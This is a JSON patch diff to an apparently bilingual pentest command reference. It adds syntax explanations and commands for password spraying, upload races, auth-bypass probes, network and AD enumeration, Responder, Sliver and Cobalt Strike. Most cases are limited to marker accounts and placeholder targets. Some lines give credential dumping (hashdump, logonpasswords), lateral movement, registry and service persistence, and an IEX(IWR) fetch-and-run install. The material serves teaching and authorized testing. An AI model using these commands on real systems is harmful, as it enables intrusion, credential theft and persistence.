+        "en": "Read-only local marker endpoint"
+       },
+       "type": "path"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "password-spraying",
+   "patches": [
+    {
+     "path": "commands.4.syntaxBreakdown",
+     "value": [
+      {
+       "part": "requests.Session()",
+       "explanation": {
+        "zh": "复用会话，保持 Cookie 一致",
+        "en": "Reuse the session so cookies stay consistent"
+       },
+       "type": "command"
+      },
+      {
+       "part": "CASES = [(\"payloader_valid\", \"PAYLOADER_WRONG\"), (\"payloader_missing\", \"PAYLOADER_WRONG\")]",
+       "explanation": {
+        "zh": "仅两个固定用例：有效账号与缺失账号，不轮换代理或 UA",
+        "en": "Only two fixed cases: a valid account and a missing account; no proxy or UA rotation"
+       },
+       "type": "value"
+      },
+      {
+       "part": "timeout=5",
+       "explanation": {
+        "zh": "单请求 5 秒超时",
+        "en": "Per-request timeout of 5 seconds"
+       },
+       "type": "parameter"
+      }
+     ]
+    },
+    {
+     "path": "commands.0.platform",
+     "value": "windows"
+    }
+   ]
+  },
+  {
+   "id": "python-pentest-scripts",
+   "patches": [
+    {
+     "path": "commands.4.syntaxBreakdown",
+     "value": [
+      {
+       "part": "ThreadPoolExecutor(max_workers=2)",
+       "explanation": {
+        "zh": "两个工作线程并发提交上传",
+        "en": "Two worker threads submit uploads concurrently"
+       },
+       "type": "command"
+      },
+      {
+       "part": "pool.map(lambda i: attempt(i, marker), range(ATTEMPTS))",
+       "explanation": {
+        "zh": "按轮次并发执行上传与读取对照",
+        "en": "Run the upload-and-read comparison concurrently per round"
+       },
+       "type": "command"
+      },
+      {
+       "part": "read.text == \"PAYLOADER_MARKER\"",
+       "explanation": {
+        "zh": "判断窗口内能否读到完整 marker 内容",
+        "en": "Check whether the full marker content becomes readable inside the window"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.5.syntaxBreakdown",
+     "value": [
+      {
+       "part": "ThreadPoolExecutor(max_workers=2)",
+       "explanation": {
+        "zh": "两个工作线程并发提交上传",
+        "en": "Two worker threads submit uploads concurrently"
+       },
+       "type": "command"
+      },
+      {
+       "part": "ATTEMPTS = 8",
+       "explanation": {
+        "zh": "共 8 轮上传与读取采样",
+        "en": "Eight rounds of upload-and-read sampling in total"
+       },
+       "type": "value"
+      },
+      {
+       "part": "for result in pool.map(lambda i: one(i, marker), range(ATTEMPTS))",
+       "explanation": {
+        "zh": "并发执行并逐轮打印上传与读取状态",
+        "en": "Execute concurrently and print upload/read status per round"
+       },
+       "type": "command"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "network-enum-tools",
+   "patches": [
+    {
+     "path": "commands.5.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-sT",
+       "explanation": {
+        "zh": "TCP 连接扫描，无需 root",
+        "en": "TCP connect scan, no root required"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-Pn",
+       "explanation": {
+        "zh": "跳过主机发现，直接扫描端口",
+        "en": "Skip host discovery and scan ports directly"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-p 80,443",
+       "explanation": {
+        "zh": "只扫描 80 与 443 两个端口",
+        "en": "Scan only ports 80 and 443"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--max-rate 5",
+       "explanation": {
+        "zh": "限速每秒 5 个探测包，替代 masscan 的 --rate",
+        "en": "Cap the rate at 5 packets per second, replacing the masscan --rate flag"
+       },
+       "type": "parameter"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "ssh-tunneling-advanced",
+   "patches": [
+    {
+     "path": "commands.5.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-L 8080:{TARGET_HOST}:80",
+       "explanation": {
+        "zh": "本地转发：访问本地 8080 即到达目标主机 80 端口",
+        "en": "Local forward: reaching local port 8080 hits the target host port 80"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "{JUMP_USER}@{JUMP_HOST}",
+       "explanation": {
+        "zh": "跳板机登录身份与地址",
+        "en": "Jump host login identity and address"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.6.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-G",
+       "explanation": {
+        "zh": "输出该主机在 SSH 配置中展开后的最终参数",
+        "en": "Print the effective expanded configuration for this host"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-D 127.0.0.1:1080",
+       "explanation": {
+        "zh": "声明动态 SOCKS 代理监听本机 1080（此处用于查看其配置展开值）",
+        "en": "Declares a dynamic SOCKS proxy on local port 1080 (shown here as its expanded config value)"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "rg '^(hostname|user|port) '",
+       "explanation": {
+        "zh": "过滤出主机名、用户与端口三行",
+        "en": "Filter down to the hostname, user, and port lines"
+       },
+       "type": "command"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "web-authentication-bypass",
+   "patches": [
+    {
+     "path": "commands.5.syntaxBreakdown",
+     "value": [
+      {
+       "part": "users=(payloader_valid payloader_missing)",
+       "explanation": {
+        "zh": "两个固定账号样本：有效账号与缺失账号",
+        "en": "Two fixed account samples: a valid account and a missing account"
+       },
+       "type": "value"
+      },
+      {
+       "part": "-w \"user=${user} code=%{http_code} size=%{size_download} time=%{time_total}\\n\"",
+       "explanation": {
+        "zh": "逐用户输出状态码、响应体大小与耗时用于对比",
+        "en": "Print status code, body size, and duration per user for comparison"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-o /dev/null",
+       "explanation": {
+        "zh": "丢弃响应体，只保留统计输出",
+        "en": "Discard the response body and keep only the metrics output"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "sleep 1",
+       "explanation": {
+        "zh": "每次尝试间隔 1 秒，避免触发限速干扰对比",
+        "en": "Wait 1 second between attempts so throttling does not skew the comparison"
+       },
+       "type": "command"
+      }
+     ]
+    },
+    {
+     "path": "commands.6.syntaxBreakdown",
+     "value": [
+      {
+       "part": "codes=(000000 000001 PAYLOADER_TEST_CODE)",
+       "explanation": {
+        "zh": "三个固定候选：两个无效码与一个核准测试码",
+        "en": "Three fixed candidates: two invalid codes and one approved test code"
+       },
+       "type": "value"
+      },
+      {
+       "part": "-d \"otp=${code}&session=PAYLOADER_TEST_SESSION\"",
+       "explanation": {
+        "zh": "提交验证码与固定测试会话",
+        "en": "Submit the code together with the fixed test session"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "sleep 1",
+       "explanation": {
+        "zh": "每次尝试间隔 1 秒",
+        "en": "Wait 1 second between attempts"
+       },
+       "type": "command"
+      }
+     ]
+    },
+    {
+     "path": "commands.7.syntaxBreakdown",
+     "value": [
+      {
+       "part": "for header in X-Forwarded-For X-Real-IP",
+       "explanation": {
+        "zh": "遍历两个转发头，验证限速键是否基于账号而非 IP",
+        "en": "Iterate the two forwarding headers to check whether the throttle key is account-based rather than IP-based"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-H \"${header}: 192.0.2.10\"",
+       "explanation": {
+        "zh": "用文档保留地址 192.0.2.10 作为固定伪造值",
+        "en": "Use the documentation-reserved address 192.0.2.10 as the fixed spoofed value"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "sleep 1",
+       "explanation": {
+        "zh": "每次尝试间隔 1 秒",
+        "en": "Wait 1 second between attempts"
+       },
+       "type": "command"
+      }
+     ]
+    },
+    {
+     "path": "commands.8.syntaxBreakdown",
+     "value": [
+      {
+       "part": "username=payloader_valid&username=payloader_valid",
+       "explanation": {
+        "zh": "重复同名参数，测试服务端参数污染解析",
+        "en": "Duplicate the same parameter name to test parameter pollution parsing"
+       },
+       "type": "value"
+      },
+      {
+       "part": "Content-Type: application/json",
+       "explanation": {
+        "zh": "同一凭据改用 JSON 体提交，测试解析差异",
+        "en": "Submit the same credentials as a JSON body to test parser differences"
+       },
+       "type": "header"
+      },
+      {
+       "part": "Username=payloader_valid&Password=PAYLOADER_WRONG",
+       "explanation": {
+        "zh": "参数名首字母大写变体",
+        "en": "Capitalized parameter-name variant"
+       },
+       "type": "value"
+      },
+      {
+       "part": "captcha=",
+       "explanation": {
+        "zh": "把验证码字段置空提交",
+        "en": "Submit with the captcha field emptied"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "file-upload-attacks",
+   "patches": [
+    {
+     "path": "commands.6.syntaxBreakdown",
+     "value": [
+      {
+       "part": "test -f \"$MARKER_FILE\"",
+       "explanation": {
+        "zh": "先确认夹具文件存在再进入循环",
+        "en": "Verify the marker fixture exists before looping"
+       },
+       "type": "command"
+      },
+      {
+       "part": "--write-out \"attempt=${i} status=%{http_code} total=%{time_total}\\n\"",
+       "explanation": {
+        "zh": "每轮输出尝试序号、状态码与总耗时",
+        "en": "Print the attempt number, status code, and total time for each round"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-F \"file=@${MARKER_FILE};type=text/plain;filename=PAYLOADER_MARKER.txt\"",
+       "explanation": {
+        "zh": "以 multipart 表单上传 marker 文本夹具",
+        "en": "Upload the marker text fixture as a multipart form field"
+       },
+       "type": "parameter"
+      }
+     ]
+    },
+    {
+     "path": "commands.7.syntaxBreakdown",
+     "value": [
+      {
+       "part": "for i in 1 2 3 4; do",
+       "explanation": {
+        "zh": "有限四轮上传与读取对照，而非无限循环",
+        "en": "Four bounded upload-and-read rounds instead of an infinite loop"
+       },
+       "type": "command"
+      },
+      {
+       "part": ">/dev/null &",
+       "explanation": {
+        "zh": "上传转入后台执行，与读取请求并发",
+        "en": "Run the upload in the background so it races the read request"
+       },
+       "type": "operator"
+      },
+      {
+       "part": "[ \"$body\" = \"PAYLOADER_MARKER\" ]",
+       "explanation": {
+        "zh": "判断窗口内是否读到完整 marker 内容",
+        "en": "Check whether the full marker content was read inside the window"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.8.syntaxBreakdown",
+     "value": [
+      {
+       "part": "AddType text/plain .marker",
+       "explanation": {
+        "zh": "让 Apache 把 .marker 按 text/plain 返回，不启用任何脚本处理器",
+        "en": "Make Apache serve .marker as text/plain without enabling any script handler"
+       },
+       "type": "value"
+      },
+      {
+       "part": ".htaccess",
+       "explanation": {
+        "zh": "Apache 目录级配置文件",
+        "en": "Apache per-directory configuration file"
+       },
+       "type": "value"
+      },
+      {
+       "part": "sample.marker",
+       "explanation": {
+        "zh": "无害的 marker 扩展名样本文件",
+        "en": "Harmless sample file with the marker extension"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.9.syntaxBreakdown",
+     "value": [
+      {
+       "part": "ThreadPoolExecutor(max_workers=2)",
+       "explanation": {
+        "zh": "两个线程在同一轮并发上传",
+        "en": "Two threads upload concurrently within one round"
+       },
+       "type": "command"
+      },
+      {
+       "part": "pool.map(lambda args: upload(*args), [(policy, \".htaccess\"), (marker, marker.name)])",
+       "explanation": {
+        "zh": "同一轮并发提交 .htaccess 策略文件与 marker",
+        "en": "Submit the .htaccess policy file and the marker concurrently in the same round"
+       },
+       "type": "command"
+      },
+      {
+       "part": "for _ in range(4)",
+       "explanation": {
+        "zh": "重复 4 轮采样竞争窗口",
+        "en": "Repeat four rounds to sample the race window"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.10.syntaxBreakdown",
+     "value": [
+      {
+       "part": "range(0, len(body), 16)",
+       "explanation": {
+        "zh": "按 16 字节分块发送，拉长服务端处理窗口",
+        "en": "Send the body in 16-byte chunks to widen the server processing window"
+       },
+       "type": "command"
+      },
+      {
+       "part": "Content-Type",
+       "explanation": {
+        "zh": "multipart 边界声明头",
+        "en": "Header declaring the multipart boundary"
+       },
+       "type": "header"
+      },
+      {
+       "part": "Transfer-Encoding",
+       "explanation": {
+        "zh": "声明 chunked 分块传输的头",
+        "en": "Header declaring chunked transfer encoding"
+       },
+       "type": "header"
+      },
+      {
+       "part": "chunked",
+       "explanation": {
+        "zh": "逐块发送请求体",
+        "en": "Send the request body chunk by chunk"
+       },
+       "type": "keyword"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "internal-recon",
+   "patches": [
+    {
+     "path": "commands.4.syntaxBreakdown",
+     "value": [
+      {
+       "part": "Get-NetIPConfiguration -Detailed",
+       "explanation": {
+        "zh": "PowerShell 读取详细网络接口配置，替代 ipconfig /all",
+        "en": "PowerShell cmdlet reading detailed interface configuration, replacing ipconfig /all"
+       },
+       "type": "command"
+      },
+      {
+       "part": "Select-Object -First 50 InterfaceAlias,IPv4Address,IPv6Address,DNSServer,NetProfile",
+       "explanation": {
+        "zh": "限制输出前 50 条并选取接口、地址、DNS 与配置档五个属性",
+        "en": "Limit to 50 rows selecting interface, address, DNS, and profile properties"
+       },
+       "type": "parameter"
+      }
+     ]
+    },
+    {
+     "path": "commands.7.syntaxBreakdown",
+     "value": [
+      {
+       "part": "Get-NetTCPConnection",
+       "explanation": {
+        "zh": "PowerShell 获取 TCP 连接表，替代 netstat -ano",
+        "en": "PowerShell cmdlet listing TCP connections, replacing netstat -ano"
+       },
+       "type": "command"
+      },
+      {
+       "part": "Where-Object State -in 'Listen','Established'",
+       "explanation": {
+        "zh": "只保留监听与已建立两种状态",
+        "en": "Keep only the Listen and Established states"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "Select-Object -First 100 LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess",
+       "explanation": {
+        "zh": "输出前 100 条连接并含 OwningProcess 以关联进程",
+        "en": "Emit the first 100 rows including OwningProcess for process correlation"
+       },
+       "type": "parameter"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "active-directory-enumeration",
+   "patches": [
+    {
+     "path": "commands.3.syntaxBreakdown",
+     "value": [
+      {
+       "part": "setspn",
+       "explanation": {
+        "zh": "Windows 的 SPN 查询工具",
+        "en": "The Windows SPN query tool"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-Q",
+       "explanation": {
+        "zh": "查询模式，按名称匹配 SPN",
+        "en": "Query mode matching SPNs by name"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "HTTP/{SERVICE_HOST}",
+       "explanation": {
+        "zh": "按服务类 HTTP 过滤目标主机的 SPN",
+        "en": "Filter SPNs of the target host by the HTTP service class"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.4.syntaxBreakdown",
+     "value": [
+      {
+       "part": "Get-ADUser",
+       "explanation": {
+        "zh": "AD 用户查询命令",
+        "en": "The AD user query cmdlet"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-LDAPFilter '(servicePrincipalName=*)'",
+       "explanation": {
+        "zh": "用 LDAP 过滤器筛选具有 SPN 的用户",
+        "en": "LDAP filter selecting users that have a SPN"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-SearchBase '{SEARCH_BASE}'",
+       "explanation": {
+        "zh": "限定搜索基准 DN",
+        "en": "Constrain the search base DN"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-ResultSetSize 100",
+       "explanation": {
+        "zh": "结果上限 100 条",
+        "en": "Cap the result set at 100 items"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-Properties ServicePrincipalName",
+       "explanation": {
+        "zh": "额外返回 SPN 属性",
+        "en": "Also return the SPN property"
+       },
+       "type": "parameter"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "post-exploitation-tools",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "./sliver-server\n# 交互模式\ngenerate --http {TARGET} --os windows\nlisteners\nhttp --lhost 0.0.0.0 --lport 80\nuse SESSION_ID"
+    }
+   ]
+  },
+  {
+   "id": "theharvester",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "theHarvester -d {TARGET} -b bing,linkedin,shodan"
+    }
+   ]
+  },
+  {
+   "id": "osint-tools",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "theHarvester -d {TARGET} -b bing,linkedin\n# hunter.io API\ncurl \"https://api.hunter.io/v2/domain-search?domain={TARGET}&api_key=KEY\""
+    }
+   ]
+  },
+  {
+   "id": "responder",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "responder -I eth0 -A -v"
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "当前 Responder 版本已移除旧版的 -f 主机指纹参数，改用分析模式 -A 被动收集指纹线索并输出详细事件；记录监听接口、运行模式、协议事件和输出文件，并将采集范围限制在授权网段。",
+      "en": "Current Responder releases removed the legacy -f host fingerprint flag; collect fingerprint leads passively with -A analyze mode and verbose events. Record the listening interface, operating mode, protocol events, and output files while limiting collection to the authorized network segment."
+     }
+    },
+    {
+     "path": "commands.4.command",
+     "value": "# Responder 无 --disable-smb CLI 参数，SMB 等协议开关在 Responder.conf\nsed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf\n# 修改后重启 Responder 生效"
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "Responder 没有 --disable-smb 命令行参数，SMB 等协议开关位于 Responder.conf（apt 安装为 /etc/responder/Responder.conf）；把 SMB 改为 Off 并重启 Responder 生效，采集范围限制在授权网段。",
+      "en": "Responder has no --disable-smb command-line flag; SMB and other protocol switches live in Responder.conf (/etc/responder/Responder.conf for apt installs). Set SMB to Off and restart Responder to apply, keeping collection limited to the authorized network segment."
+     }
+    }
+   ]
+  },
+  {
+   "id": "wireshark-tshark",
+   "patches": [
+    {
+     "path": "commands.6.command",
+     "value": "tshark -r fixtures/session-http.pcapng -Y 'http.cookie contains \"PAYLOADER_TEST_SESSION\"' -T fields -e frame.number -e http.host -e http.cookie\ncurl -sS --max-time 5 -b \"session=PAYLOADER_TEST_SESSION\" http://127.0.0.1:8080/marker\n# The capture is synthetic and offline; replay is limited to a revocable localhost marker session."
+    }
+   ]
+  },
+  {
+   "id": "decompilers",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "jadx：从 https://github.com/skylot/jadx/releases 下载发行版，或用 apt/brew 包管理器安装；apktool：apt install apktool；ilspycmd：dotnet tool install -g ilspycmd。PyPI 上不存在 jadx 包。",
+      "en": "jadx: get a release from the skylot/jadx GitHub project or install via apt/brew; apktool: apt install apktool; ilspycmd: dotnet tool install -g ilspycmd. There is no jadx package on PyPI."
+     }
+    }
+   ]
+  },
+  {
+   "id": "aliyun-tencent-cloud",
+   "patches": [
+    {
+     "path": "installation",
+     "value": {
+      "zh": "阿里云 CLI 为 Go 二进制：从 https://github.com/aliyun/aliyun-cli/releases 下载或 brew install aliyun-cli；腾讯云 tccli：pip install tccli；ossutil：从阿里云官方 GitHub Release 获取。npm 上不存在 @alicloud/cli 包。",
+      "en": "The Alibaba Cloud CLI is a Go binary: grab a release of aliyun/aliyun-cli from GitHub, or run brew install aliyun-cli; Tencent tccli: pip install tccli; ossutil: fetch from the official Alibaba Cloud GitHub releases. The npm package @alicloud/cli does not exist."
+     }
+    }
+   ]
+  },
+  {
+   "id": "atomic-red-team",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "pwsh -c \"IEX(IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -getAtomics\"\n# 执行\npwsh -c \"Invoke-AtomicTest T1059.004\""
+    }
+   ]
+  },
+  {
+   "id": "cobalt-strike",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "# 基础信息\nwhoami\nshell ipconfig\ngetuid\n\n# 横向移动\njump psexec {LAB_HOST} SMB_listener\njump winrm {LAB_HOST} HTTP_listener\n\n# 凭证获取\nhashdump\nlogonpasswords\n\n# 持久化（Beacon 无原生 persist-* 命令，用 shell 调系统命令）\nshell sc create PayloaderLabSvc binPath= \"C:\\\\Windows\\\\Temp\\\\lab-svc.exe\" start= auto\nshell reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v PayloaderLab /d \"C:\\\\Windows\\\\Temp\\\\lab-beacon.exe\" /f"
+    }
+   ]
+  },
+  {
+   "id": "dnspy",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "# dnSpy GUI 无批量导出 CLI，批量导出工程用 ILSpy 命令行\nilspycmd --project --outputdir ./decompiled {BINARY}"
+    }
+   ]
+  },
+  {
+   "id": "git-operations",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "gitleaks detect --source .\ngitleaks detect --source . --verbose --report-format json --report-path leaks.json"
+    }
+   ]
+  },
+  {
+   "id": "graphqlmap",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "python3 graphqlmap.py -u https://{TARGET}/graphql --method POST\n# 进入交互 shell 后执行 dump_schema"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "python3 graphqlmap.py -u https://{TARGET}/graphql --method POST\n# 进入交互 shell 后执行 enum"
+    },
+    {
+     "path": "commands.2.command",
+     "value": "python3 graphqlmap.py -u https://{TARGET}/graphql --method POST\n# 进入交互 shell 后执行 nosqli"
+    }
+   ]
+  },
+  {
+   "id": "ics-scada-security",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "python plcscan.py target\nplcscan -p 102 192.168.1.0/24\n# Redpoint NSE 脚本\nnmap -p 102 --script s7-info target"
+    }
+   ]
+  },
+  {
+   "id": "inveigh",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "# C# 版为独立编译的 InveighZero 二进制，不经 -Tool 参数切换\nInveigh.exe -ConsoleOutput Y"
+    }
+   ]
+  },
+  {
+   "id": "exploit-db-search",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "search type:exploit name:apache\nsearch cve:2021-44228\nsearch platform:windows name:smb"
+    }
+   ]
+  }
+ ]
+}
